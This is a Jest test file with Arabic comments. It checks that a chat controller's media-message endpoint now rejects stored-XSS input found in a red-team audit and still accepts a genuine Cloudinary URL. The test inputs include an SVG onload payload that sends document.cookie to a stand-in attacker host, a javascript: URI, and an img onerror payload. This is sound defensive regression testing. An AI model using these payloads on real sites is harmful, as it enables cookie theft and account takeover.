// ملف: privateChatController.mediaValidation.test.js
// 🛡️ مراجعة أمنية (redteam-audit-1 — البند #3، Critical، XSS مخزَّن مُثبَت فعلياً): sendMediaMessage
// كانت تقبل mediaUrl/thumbnail من req.body حرفياً بلا أي تحقّق صيغة/مصدر، وتُخزَّنان كما هما —
// مسار مستقل تماماً عن مسارات الرفع الحقيقية (/api/chat-media/*)، فمهاجم يستدعيه مباشرة بأي
// نص كـ"><svg/onload=...> يُخزَّن حرفياً ويُدرَج لاحقاً بالعميل داخل خاصية src/data-* بلا تهريب
// (راجع أيضاً تشديد العميل بـescapeHtml لنفس المسارات — طبقة حماية ثانية). يختبر هذا الملف
// أن الحمولة الخبيثة الحقيقية المُستخدَمة بالتقرير تُرفَض الآن قبل أي كتابة لقاعدة البيانات
// إطلاقاً، وأن رابط Cloudinary حقيقي شرعي يبقى يعمل بلا أي تأثير على السلوك الطبيعي
jest.useFakeTimers();

process.env.CLOUDINARY_CLOUD_NAME = process.env.CLOUDINARY_CLOUD_NAME || 'test-cloud-name';

const User = require('../../models/User');
const PrivateChat = require('../../models/PrivateChat');
const PrivateMessage = require('../../models/PrivateMessage');
const { sendMediaMessage } = require('../privateChatController');

function chainable(value) {
    const p = Promise.resolve(value);
    p.select = () => p;
    p.populate = () => p;
    p.lean = () => p;
    return p;
}

function mockRes() {
    return { status: jest.fn().mockReturnThis(), json: jest.fn().mockReturnThis() };
}

function mockReq(body) {
    return {
        user: { id: '000000000000000000000001', username: 'Sender', profileImage: '' },
        body,
        app: { get: () => null }
    };
}

describe('sendMediaMessage — رفض أي رابط وسائط ليس من مصدر Cloudinary الحقيقي', () => {
    afterEach(() => jest.restoreAllMocks());

    test('الحمولة الخبيثة الفعلية من التقرير ("><svg/onload=...>): تُرفَض 400 قبل أي كتابة قاعدة بيانات إطلاقاً', async () => {
        jest.spyOn(User, 'findById').mockImplementation((id) => chainable(
            id === '000000000000000000000001' ? { _id: '000000000000000000000001', blockedUsers: [] } : { _id: '000000000000000000000002', blockedUsers: [], socketId: null }
        ));
        const findOneSpy = jest.spyOn(PrivateChat, 'findOne');
        const createMsgSpy = jest.spyOn(PrivateMessage, 'create');

        const maliciousPayload = '"><svg/onload=fetch(\'https://attacker.test/steal?c=\'+document.cookie)>';
        const req = mockReq({ receiverId: '000000000000000000000002', mediaUrl: maliciousPayload, mediaType: 'image' });
        const res = mockRes();
        await sendMediaMessage(req, res);

        expect(res.status).toHaveBeenCalledWith(400);
        expect(findOneSpy).not.toHaveBeenCalled();
        expect(createMsgSpy).not.toHaveBeenCalled();
    });

    test('javascript: URI بدل رابط حقيقي: تُرفَض كذلك', async () => {
        jest.spyOn(User, 'findById').mockImplementation((id) => chainable(
            id === '000000000000000000000001' ? { _id: '000000000000000000000001', blockedUsers: [] } : { _id: '000000000000000000000002', blockedUsers: [], socketId: null }
        ));
        const createMsgSpy = jest.spyOn(PrivateMessage, 'create');

        const req = mockReq({ receiverId: '000000000000000000000002', mediaUrl: 'javascript:alert(document.cookie)', mediaType: 'image' });
        const res = mockRes();
        await sendMediaMessage(req, res);

        expect(res.status).toHaveBeenCalledWith(400);
        expect(createMsgSpy).not.toHaveBeenCalled();
    });

    test('رابط Cloudinary حقيقي شرعي (نفس نمط secure_url الحقيقي): يُقبَل ويُخزَّن كما هو تماماً', async () => {
        const legitimateUrl = `https://res.cloudinary.com/${process.env.CLOUDINARY_CLOUD_NAME}/image/upload/v1700000000/chat_media/real_photo.jpg`;
        jest.spyOn(User, 'findById').mockImplementation((id) => chainable(
            id === '000000000000000000000001' ? { _id: '000000000000000000000001', blockedUsers: [] } : { _id: '000000000000000000000002', blockedUsers: [], socketId: null }
        ));
        jest.spyOn(PrivateChat, 'findOne').mockReturnValue(chainable(null));
        const chatSave = jest.fn().mockResolvedValue(undefined);
        jest.spyOn(PrivateChat, 'create').mockResolvedValue({
            chatId: '000000000000000000000001_000000000000000000000002', unreadCount: new Map(), hiddenBy: [], save: chatSave
        });
        const createMsgSpy = jest.spyOn(PrivateMessage, 'create').mockResolvedValue({ _id: 'm1' });
        jest.spyOn(PrivateMessage, 'findById').mockReturnValue(chainable({ _id: 'm1', content: legitimateUrl }));

        const req = mockReq({ receiverId: '000000000000000000000002', mediaUrl: legitimateUrl, mediaType: 'image' });
        const res = mockRes();
        await sendMediaMessage(req, res);

        expect(createMsgSpy).toHaveBeenCalledWith(expect.objectContaining({ content: legitimateUrl }));
        expect(res.status).not.toHaveBeenCalledWith(400);
    });

    test('mediaUrl صالح لكن thumbnail خبيث: تُرفَض أيضاً (كلا الحقلين يُفحصان)', async () => {
        const legitimateUrl = `https://res.cloudinary.com/${process.env.CLOUDINARY_CLOUD_NAME}/video/upload/v1700000000/chat_media/real_video.mp4`;
        jest.spyOn(User, 'findById').mockImplementation((id) => chainable(
            id === '000000000000000000000001' ? { _id: '000000000000000000000001', blockedUsers: [] } : { _id: '000000000000000000000002', blockedUsers: [], socketId: null }
        ));
        const createMsgSpy = jest.spyOn(PrivateMessage, 'create');

        const req = mockReq({
            receiverId: '000000000000000000000002', mediaUrl: legitimateUrl, mediaType: 'video',
            thumbnail: '"><img src=x onerror=alert(1)>'
        });
        const res = mockRes();
        await sendMediaMessage(req, res);

        expect(res.status).toHaveBeenCalledWith(400);
        expect(createMsgSpy).not.toHaveBeenCalled();
    });
});
